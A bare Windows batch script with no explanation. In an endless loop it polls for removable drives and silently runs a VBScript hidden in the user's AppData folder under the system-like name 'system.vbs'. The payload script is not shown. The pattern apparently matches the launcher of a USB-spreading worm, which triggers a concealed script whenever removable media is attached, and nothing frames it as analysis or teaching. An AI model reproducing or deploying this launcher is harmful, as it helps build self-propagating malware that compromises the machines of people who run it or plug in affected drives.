@echo off
setlocal enabledelayedexpansion
set vbsPath=%APPDATA%\system.vbs

:loop
for /f "tokens=2 delims==" %%i in ('wmic logicaldisk where "DriveType=2" get DeviceID /value') do (
    cscript.exe "%vbsPath%" //nologo
)

timeout /t 1 /nobreak >nul
goto loop
